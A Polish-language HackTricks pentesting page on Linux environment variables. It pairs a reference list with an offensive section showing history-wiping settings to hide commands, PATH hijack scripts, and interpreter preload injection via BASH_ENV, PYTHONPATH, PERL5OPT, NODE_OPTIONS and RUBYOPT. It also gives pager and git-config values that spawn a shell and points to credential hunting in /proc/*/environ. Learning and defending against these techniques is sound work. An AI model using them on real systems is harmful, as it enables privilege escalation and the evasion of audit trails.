# Zmienne środowiskowe Linux

{{#include ../../banners/hacktricks-training.md}}

## Zmienne globalne

Zmienne globalne **będą** dziedziczone przez **procesy potomne**.

Możesz utworzyć zmienną globalną dla bieżącej sesji, wykonując:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Ta zmienna będzie dostępna w bieżących sesjach i ich procesach potomnych.

Możesz **usunąć** zmienną, wykonując:
```bash
unset MYGLOBAL
```
## Zmienne lokalne

Do **zmiennych lokalnych** można uzyskać dostęp wyłącznie z poziomu **bieżącej powłoki/skryptu**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Lista bieżących zmiennych
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Zawartość `/proc/*/environ` jest **rozdzielona znakami NUL**, dlatego te warianty są zwykle łatwiejsze do odczytania:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Jeśli szukasz **credentials** lub **interesującej konfiguracji usług** w odziedziczonych środowiskach, sprawdź również [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Typowe zmienne

Źródło: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)

- **DISPLAY** – wyświetlacz używany przez **X**. Ta zmienna jest zwykle ustawiona na **:0.0**, co oznacza pierwszy wyświetlacz na bieżącym komputerze.
- **EDITOR** – preferowany edytor tekstu użytkownika.
- **HISTFILESIZE** – maksymalna liczba wierszy zawartych w pliku historii.
- **HISTSIZE** – liczba wierszy dodawanych do pliku historii po zakończeniu sesji przez użytkownika.
- **HOME** – katalog domowy użytkownika.
- **HOSTNAME** – nazwa hosta komputera.
- **LANG** – bieżący język.
- **MAIL** – lokalizacja bufora pocztowego użytkownika. Zwykle **/var/spool/mail/USER**.
- **MANPATH** – lista katalogów przeszukiwanych w celu znalezienia stron podręcznika.
- **OSTYPE** – typ systemu operacyjnego.
- **PS1** – domyślny prompt w bash.
- **PATH** – przechowuje ścieżki wszystkich katalogów zawierających pliki binarne, które chcesz uruchamiać, podając jedynie nazwę pliku, a nie ścieżkę względną lub absolutną.
- **PWD** – bieżący katalog roboczy.
- **SHELL** – ścieżka do bieżącej powłoki poleceń, na przykład **/bin/bash**.
- **TERM** – bieżący typ terminala, na przykład **xterm**.
- **TZ** – strefa czasowa użytkownika.
- **USER** – bieżąca nazwa użytkownika.

## Interesujące zmienne dla hacking

Nie każda zmienna jest równie przydatna. Z perspektywy ofensywnej należy priorytetowo traktować zmienne zmieniające **ścieżki wyszukiwania**, **pliki startowe**, **zachowanie dynamicznego linkera** lub **audytowanie/logowanie**.

### **HISTFILESIZE**

Zmień **wartość tej zmiennej na 0**, aby po **zakończeniu sesji** **plik historii** (\~/.bash_history) został **obcięty do 0 wierszy**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Zmień **wartość tej zmiennej na 0**, aby polecenia **nie były przechowywane w historii w pamięci** ani zapisywane z powrotem do **pliku historii** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Jeśli **wartość tej zmiennej jest ustawiona na `ignorespace` lub `ignoreboth`**, każda komenda poprzedzona dodatkową spacją nie zostanie zapisana w historii.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Skieruj **plik historii** do **`/dev/null`** lub całkowicie go wyłącz. Zwykle jest to bardziej niezawodne niż sama zmiana rozmiaru historii.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Procesy będą używać zadeklarowanego tutaj **proxy**, aby łączyć się z Internetem przez **http lub https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: domyślny proxy dla narzędzi/protokołów, które go respektują.
- `no_proxy`: lista wyjątków (hostów/domen/CIDR-ów), które powinny łączyć się bezpośrednio.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
W zależności od narzędzia można używać wariantów pisanych małymi lub wielkimi literami (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Procesy będą ufać certyfikatom wskazanym w **tych zmiennych środowiskowych**. Jest to przydatne, aby narzędzia takie jak **`curl`**, **`git`**, klienty HTTP w Pythonie lub menedżery pakietów ufały CA kontrolowanemu przez attackera (na przykład w celu sprawienia, aby interception proxy wyglądał wiarygodnie).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Jeśli uprzywilejowany wrapper/skrypt wykonuje polecenia **bez ścieżek bezwzględnych**, wygrywa pierwszy kontrolowany przez atakującego katalog w `PATH`. To podstawowy mechanizm wielu **PATH hijacks** w `sudo`, zadaniach cron, wrapperach powłoki i niestandardowych helperach SUID. Szukaj `env_keep+=PATH`, słabego `secure_path` lub wrapperów, które wywołują `tar`, `service`, `cp`, `python` itd. po nazwie.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
W przypadku pełnych łańcuchów eskalacji uprawnień wykorzystujących `PATH` sprawdź [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` to nie tylko odwołanie do katalogu: wiele narzędzi automatycznie ładuje **dotfiles**, **plugins** i **konfigurację per-user** z `$HOME` lub `$XDG_CONFIG_HOME`. Jeśli uprzywilejowany workflow zachowuje te wartości, **config injection** może być łatwiejszy niż binary hijacking.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Interesujące cele obejmują `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` oraz pliki specyficzne dla narzędzi, takie jak `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Te zmienne wpływają na **dynamic linker**:

- `LD_PRELOAD`: wymusza wcześniejsze załadowanie dodatkowych obiektów współdzielonych.
- `LD_LIBRARY_PATH`: dodaje katalogi wyszukiwania bibliotek na początku ścieżki.
- `LD_AUDIT`: ładuje biblioteki audytujące, które obserwują ładowanie bibliotek i rozwiązywanie symboli.

Są niezwykle wartościowe w **hooking**, **instrumentacji** i **eskalacji uprawnień**, jeśli uprzywilejowane polecenie zachowuje te zmienne. W trybie **secure-execution** (`AT_SECURE`, np. setuid/setgid/capabilities) loader usuwa lub ogranicza wiele z tych zmiennych. Jednak błędy parsera na tym wczesnym etapie działania loadera nadal mają poważne skutki, ponieważ występują **przed** uruchomieniem programu docelowego.
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` zmienia wczesne działanie glibc (na przykład ustawienia allocatorów) i jest bardzo przydatne w laboratoriach exploitów. Ma również znaczenie z perspektywy bezpieczeństwa, ponieważ **dynamiczny loader analizuje tę zmienną bardzo wcześnie**. Błąd **Looney Tunables** z 2023 roku był dobrym przypomnieniem, że pojedyncza zmienna środowiskowa analizowana przez loader może stać się **prymitywem lokalnej eskalacji uprawnień** w przypadku programów SUID.
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Jeśli **Bash** jest uruchamiany **non-interaktywnie**, sprawdza `BASH_ENV` i source'uje ten plik przed uruchomieniem docelowego skryptu. Gdy Bash jest wywoływany jako `sh` lub w interaktywnym trybie POSIX, może również sprawdzać `ENV`. Jest to klasyczny sposób na przekształcenie shell wrappera w code execution, jeśli środowisko jest kontrolowane przez atakującego.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Sam Bash wyłącza te pliki startowe, gdy **rzeczywiste/efektywne identyfikatory różnią się**, chyba że użyto `-p`, więc dokładne zachowanie zależy od tego, w jaki sposób wrapper uruchamia powłokę. Należy zachować ostrożność w przypadku uprzywilejowanych wrapperów, które wywołują `setuid()`/`setgid()` **przed** uruchomieniem Bash: gdy identyfikatory ponownie się zgadzają, Bash może zaufać `BASH_ENV`, `ENV` oraz powiązanemu stanowi powłoki, które w przeciwnym razie zostałyby zignorowane.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Te zmienne zmieniają sposób uruchamiania Pythona:

- `PYTHONPATH`: dodaje ścieżki wyszukiwania importów na początku.
- `PYTHONHOME`: zmienia lokalizację drzewa standardowej biblioteki.
- `PYTHONSTARTUP`: wykonuje plik przed wyświetleniem interaktywnego promptu.
- `PYTHONINSPECT=1`: przechodzi do trybu interaktywnego po zakończeniu działania skryptu.

Są przydatne przeciwko skryptom maintenance, debuggerom, shellom i wrapperom, które uruchamiają Pythona ze środowiskiem kontrolowanym przez atakującego. `python -E` i `python -I` ignorują wszystkie zmienne `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Niedawnym przykładem z prawdziwego świata było LPE w **needrestart** z 2024 roku w systemach Ubuntu/Debian: skaner uruchamiany jako root kopiował `PYTHONPATH` z `/proc/<PID>/environ` procesu bez uprawnień, a następnie wykonywał Pythona. Opublikowany exploit umieszczał `importlib/__init__.so` w ścieżce kontrolowanej przez atakującego, dzięki czemu Python wykonywał kod atakującego podczas własnej inicjalizacji, zanim znaczenie miał nawet skrypt pomocniczy zapisany na sztywno.

### **PERL5OPT & PERL5LIB**

Perl ma równie przydatne zmienne uruchomieniowe:

- `PERL5LIB`: dodaje katalogi bibliotek na początku ścieżki.
- `PERL5OPT`: wstrzykuje przełączniki tak, jakby znajdowały się w wierszu poleceń każdego polecenia `perl`.

Może to wymusić **automatyczne ładowanie modułów** lub zmienić zachowanie interpretera, zanim skrypt docelowy wykona cokolwiek istotnego. Perl ignoruje te zmienne w kontekstach **taint / setuid / setgid**, ale nadal mają one duże znaczenie w przypadku zwykłych wrapperów uruchamianych jako root, zadań CI, instalatorów i niestandardowych reguł sudoers.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` dodaje **flagi CLI Node.js** do każdego procesu `node`, który dziedziczy środowisko. Dzięki temu jest przydatne przeciwko wrapperom, zadaniom CI, pomocniczym procesom Electron oraz regułom sudo, które ostatecznie uruchamiają Node. Z punktu widzenia ofensywnego najciekawsze flagi to zazwyczaj:

- `--require <file>`: preloaduje plik CommonJS przed skryptem docelowym.
- `--import <module>`: preloaduje moduł ES przed skryptem docelowym.

Node odrzuca niektóre niebezpieczne flagi w `NODE_OPTIONS`, ale `--require` i `--import` są wyraźnie dozwolone i są przetwarzane **przed** regularnymi argumentami wiersza poleceń.
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
W przypadku zdalnych gadget chains, które pośrednio ustawiają `NODE_OPTIONS` (na przykład poprzez prototype-pollution prowadzące do RCE), sprawdź [tę inną stronę](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby oferuje tę samą klasę nadużyć podczas uruchamiania:

- `RUBYLIB`: dodaje katalogi na początku ścieżki ładowania Ruby.
- `RUBYOPT`: wstrzykuje opcje wiersza poleceń, takie jak `-r`, do każdego wywołania `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Wrażliwości **needrestart** z 2024 roku pokazały, że nie jest to tylko trik laboratoryjny: ten sam helper należący do użytkownika root, który był podatny na nadużycie `PYTHONPATH`, mógł również zostać zmuszony do uruchomienia Ruby z kontrolowanym przez atakującego `RUBYLIB`, ładując `enc/encdb.so` z katalogu atakującego.

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR i LESSOPEN**

Niektóre narzędzia nie tylko odczytują ścieżkę ze środowiska; przekazują wartość do **shella**, **edytora** lub **preprocesora wejścia**. Dzięki temu poniższe zmienne są szczególnie interesujące, gdy uprzywilejowany wrapper uruchamia `git`, `man`, `less` lub podobne przeglądarki tekstu:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: wybierają polecenie pagera.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: wybierają polecenie edytora, często wraz z argumentami.
- `LESSOPEN`, `LESSCLOSE`: definiują pre- i postprocesory uruchamiane, gdy `less` otwiera plik.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git obsługuje również **wstrzykiwanie konfiguracji wyłącznie przez zmienne środowiskowe** bez zapisywania na dysku za pomocą `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` oraz `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Z perspektywy post-exploitation pamiętaj również, że odziedziczone środowiska często zawierają **credentials**, **proxy settings**, **service tokens** lub **cloud keys**. Sprawdź [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md), aby poznać wyszukiwanie w `/proc/<PID>/environ` oraz `systemd` `Environment=`.

### PS1

Zmień wygląd swojego promptu.

[**To jest przykład**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: To jest przykład](<../images/image (897).png>)

Zwykły użytkownik:

![PERL5OPT & PERL5LIB - PS1: Jedno, dwa i trzy zadania uruchomione w tle](<../images/image (740).png>)

Jedno, dwa i trzy zadania uruchomione w tle:

![PERL5OPT & PERL5LIB - PS1: Jedno, dwa i trzy zadania uruchomione w tle](<../images/image (145).png>)

Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie:

![PERL5OPT & PERL5LIB - PS1: Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie](<../images/image (715).png>)

## Odnośniki

- [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)

{{#include ../../banners/hacktricks-training.md}}
